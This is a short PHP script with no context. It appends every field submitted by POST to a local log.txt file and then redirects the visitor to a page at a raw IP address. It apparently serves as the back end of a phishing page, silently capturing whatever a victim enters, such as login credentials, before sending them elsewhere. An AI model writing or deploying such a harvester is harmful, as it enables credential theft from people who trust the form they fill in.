<?php

$file = 'log.txt';

file_put_contents($file, "
", FILE_APPEND);

file_put_contents($file, print_r($_POST, true), FILE_APPEND);

file_put_contents($file, "", FILE_APPEND);

file_put_contents($file, ":::::::::::::::::::::::::::::::::::::::::", FILE_APPEND);

file_put_contents($file, "
", FILE_APPEND);
file_put_contents($file, "", FILE_APPEND);

header('Location: http://208.53.205.25/down.html');

exit;

?>

